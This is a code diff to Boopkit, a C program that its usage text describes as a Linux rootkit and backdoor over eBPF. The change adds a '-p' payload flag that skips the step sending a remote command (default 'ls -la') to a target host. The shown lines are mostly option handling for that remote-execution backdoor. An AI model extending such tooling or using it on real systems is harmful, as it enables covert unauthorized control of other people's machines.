@@ -37,6 +37,7 @@
 // clang-format on
 
 void usage() {
+  asciiheader();
   boopprintf("Boopkit version: %s\n", VERSION);
   boopprintf("Linux rootkit and backdoor over eBPF.\n");
   boopprintf("Author: Kris Nóva <kris@nivenly.com>\n");
@@ -66,6 +67,7 @@ struct config {
   char lhost[INET_ADDRSTRLEN];
   char lport[MAX_PORT_STR];
   char rce[MAX_RCE_SIZE];
+  int payload;
 } cfg;
 
 // clisetup will initialize the config struct for the program
@@ -76,6 +78,7 @@ void clisetup(int argc, char **argv) {
   strncpy(cfg.rhost, "127.0.0.1", INET_ADDRSTRLEN);
   strncpy(cfg.rport, "22", MAX_PORT_STR);
   strncpy(cfg.rce, "ls -la", MAX_RCE_SIZE);
+  cfg.payload = 0;
   for (int i = 0; i < argc; i++) {
     if (strncmp(argv[i], "-lport", 32) == 0 && argc >= i + 1) {
       strncpy(cfg.lport, argv[i + 1], MAX_PORT_STR);
@@ -99,6 +102,9 @@ void clisetup(int argc, char **argv) {
           break;
         case 'q':
           quiet = 1;
+          break;
+        case 'p':
+          cfg.payload = 1;
           break;
       }
     }
@@ -319,11 +325,13 @@ int main(int argc, char **argv) {
   close(sock3);
   // ===========================================================================
 
-  int errno;
-  errno = serverce(saddrstr, cfg.rce);
-  if (errno != 0) {
-    boopprintf(" Error serving RCE!\n");
+  if (!cfg.payload) {
+    int errno;
+    errno = serverce(saddrstr, cfg.rce);
+    if (errno != 0) {
+      boopprintf(" Error serving RCE!\n");
+    }
+    boopprintf("EXEC  -> [%s]\n", cfg.rce);
   }
-  boopprintf("EXEC  -> [%s]\n", cfg.rce);
   return 0;
 }
